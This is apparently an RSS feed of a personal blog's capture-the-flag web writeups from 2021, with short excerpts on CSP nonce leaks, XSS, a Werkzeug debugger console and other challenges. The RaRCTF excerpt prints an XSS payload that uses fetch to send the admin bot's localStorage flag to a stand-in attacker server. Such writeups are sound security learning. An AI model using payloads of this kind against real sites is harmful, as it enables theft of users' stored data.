<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>writeups on Jam ⇆ Vie</title>
    <link>https://jamvie.net/tags/writeups/</link>
    <description>Recent content in writeups on Jam ⇆ Vie</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 24 Oct 2021 13:49:21 -0700</lastBuildDate><atom:link href="https://jamvie.net/tags/writeups/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>ASIS Quals 2021: Lovely Nonce</title>
      <link>https://jamvie.net/posts/2021/10/asis-quals-2021-lovely-nonce/</link>
      <pubDate>Sun, 24 Oct 2021 13:49:21 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/10/asis-quals-2021-lovely-nonce/</guid>
      <description>Lovely Nonces is a challenge from ASIS Quals 2021, involving interesting CSP bypasses and stylesheet leaks. My teammate Ming and I solved this challenge together, and a copy of the writeup (with the index.html file used in the exploit) can be found in the UBC CTF blog.
TL;DR CSS attribute selectors for a stylesheet leak of the CSP nonce combined with XSS.
Recon The CSP is implemented via a meta-tag in the DOM, and not through response header as is usually the common practise.</description>
    </item>
    
    <item>
      <title>RaRCTF 2021: MAAS 2 &#43; Unintended Solutions</title>
      <link>https://jamvie.net/posts/2021/08/rarctf-2021-maas-2-unintended-solutions/</link>
      <pubDate>Fri, 20 Aug 2021 13:49:21 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/08/rarctf-2021-maas-2-unintended-solutions/</guid>
      <description>MAAS 2 // Notes Source was the same from MAAS 1 (and will be the same for MAAS 3). MAAS 2 involved the &amp;lsquo;notes&amp;rsquo; part of MAAS, where you are prompted to register a user and afterwards add key:val attributes to yourself, give yourself a bio, or transfer key:value attributes to another user.
The provided source has some interesting code:
notes/app.py
@app.route(&amp;#39;/useraction&amp;#39;, methods=[&amp;#34;POST&amp;#34;]) def useraction(): mode = request.form.get(&amp;#34;mode&amp;#34;) username = request.</description>
    </item>
    
    <item>
      <title>RaRCTF2021: Some simpler web probz</title>
      <link>https://jamvie.net/posts/2021/08/rarctf2021-some-simpler-web-probz/</link>
      <pubDate>Mon, 09 Aug 2021 13:49:21 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/08/rarctf2021-some-simpler-web-probz/</guid>
      <description>Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&amp;rsquo;re stealing admin&amp;rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
Insert as your payload:
title: eh link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getItem(&amp;quot;flag&amp;quot;))); And report to admin. Careful with the wait times&amp;hellip;
NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure.</description>
    </item>
    
    <item>
      <title>DEF CON Quals 2021: Getting Gud &#43; threefactooorx</title>
      <link>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud-threefactooorx/</link>
      <pubDate>Sun, 11 Apr 2021 00:07:54 -0600</pubDate>
      
      <guid>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud-threefactooorx/</guid>
      <description>AKA - How I spent some time reading custom partially-deobfuscated javascript code and actually used the Chrome debugger for once
DEF CON - undoubtedly the most notorious, famous and recgonized CTF out there. Even people who don&amp;rsquo;t do hacking know about DEF CON. The qualifiers, an event that took place this last weekend, ran for roughly 2 days and had 1 web challenge - which was more like reversing, but I&amp;rsquo;ll take what I can get.</description>
    </item>
    
    <item>
      <title>Bo1lersCTF 2021: Lorem_Ipsum</title>
      <link>https://jamvie.net/posts/2021/04/bo1lersctf-2021-lorem_ipsum/</link>
      <pubDate>Sun, 04 Apr 2021 03:12:16 -0600</pubDate>
      
      <guid>https://jamvie.net/posts/2021/04/bo1lersctf-2021-lorem_ipsum/</guid>
      <description>Lorem_Ipsum gave nothing but a simple homepage that allowed you to see &amp;ldquo;animal&amp;rdquo;-ified versions of the famous lorem ipsum placeholder text.
Choose among the available animals, and notice a GET query parameter that looks something like ?animal=dogs. What if you gave it text garbage instead of an expected animal?
This is a Werkzeug debugger! What fun, since Werkzeug in development mode will give you a python console with every traceback that is reported to you when something wrong happens.</description>
    </item>
    
    <item>
      <title>UTCTF 2021</title>
      <link>https://jamvie.net/posts/2021/03/utctf-2021/</link>
      <pubDate>Sun, 14 Mar 2021 17:17:38 -0600</pubDate>
      
      <guid>https://jamvie.net/posts/2021/03/utctf-2021/</guid>
      <description>Lightning Round The first few web challenges were pretty trivial so I&amp;rsquo;ll do super quick, 2-sentence descriptions on how to solve them.
Source it! Inspect source. You&amp;rsquo;ll find it.
Oinker Make an oink with the exact same content and realize that each oink has an allocated place in the webpage&amp;rsquo;s directory. (Example - inputting alert(1); leads to oink endpoint 64). Go to \oink\2 to get the flag.
Fastfox (easy way) Intended (hard) solution was escalating a JIT bug, which I will definitely research more of so expect part 2 ;) but the easy way was determining what functions were available in the scope of Bob&amp;rsquo;s jsshell.</description>
    </item>
    
    <item>
      <title>DiceCTF 2021</title>
      <link>https://jamvie.net/posts/2021/02/dicectf-2021/</link>
      <pubDate>Sun, 07 Feb 2021 19:06:12 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/02/dicectf-2021/</guid>
      <description>Babier CSP The challenge takes after justCTF&amp;rsquo;s similarly named challenge. We&amp;rsquo;re given an index.js file:
const express = require(&amp;#39;express&amp;#39;); const crypto = require(&amp;#34;crypto&amp;#34;); const config = require(&amp;#34;./config.js&amp;#34;); const app = express() const port = process.env.port || 3000; const SECRET = config.secret; const NONCE = crypto.randomBytes(16).toString(&amp;#39;base64&amp;#39;); const template = name =&amp;gt; ` &amp;lt;html&amp;gt; ${name === &amp;#39;&amp;#39; ? &amp;#39;&amp;#39;: `&amp;lt;h1&amp;gt;${name}&amp;lt;/h1&amp;gt;`}&amp;lt;a href=&amp;#39;#&amp;#39; id=elem&amp;gt;View Fruit&amp;lt;/a&amp;gt; &amp;lt;script nonce=${NONCE}&amp;gt; elem.onclick = () =&amp;gt; { location = &amp;#34;/?</description>
    </item>
    
    <item>
      <title>justCTF[*] 2020 - A Collection of Web Problems</title>
      <link>https://jamvie.net/posts/2021/01/justctf-2020-a-collection-of-web-problems/</link>
      <pubDate>Sun, 31 Jan 2021 23:05:20 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/01/justctf-2020-a-collection-of-web-problems/</guid>
      <description>This last weekend was justCTF 2020 (delayed last year so it was held this year :P), held by justCatTheFish. Although I was focused between this and some other work, I was able to look through a few of the web challenges and will document them here.
Forgotten Name I found this on a total fluke. I wasn&amp;rsquo;t paying attention to the challenge much but the description was compelling:
I&amp;rsquo;m hesitant to attempt to nmap all known domains of justCatTheFish&amp;rsquo;s network, and so instead thought about the nature of their subdomains.</description>
    </item>
    
  </channel>
</rss>
